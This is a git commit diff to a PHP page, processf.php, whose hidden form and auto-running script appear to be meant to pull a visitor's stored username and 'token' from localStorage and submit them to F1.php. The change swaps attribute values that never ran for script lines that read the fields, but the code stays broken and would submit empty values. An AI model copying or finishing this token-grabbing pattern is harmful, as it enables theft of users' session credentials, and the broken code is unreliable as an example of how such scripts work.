50b8430b2406d3865dcc332d77ad2fa0403f6dd9
BadBoyLu <68569513+badboylu@users.noreply.github.com>
2021-01-27 04:05:28 +0200

    Update processf.php

--- processf.php
+++ processf.php
@@ -1,10 +1,12 @@
 <html>
 <form action="F1.php" method="get" id="key">
-<input name="username" type="hidden" value=" localStorage.getItem('username') " id="user">
-<input name="auth" type="hidden" value=" localStorage.getItem('token') " id="auth">
+<input name="username" type="hidden" value="" id="user">
+<input name="auth" type="hidden" value="" id="auth">
 </form>
 <script>
 function keys(){
+username = document.getElementById("user").value;
+token = document.getElementById("auth").value;
 document.getElementById("key").submit();
 }
 keys();
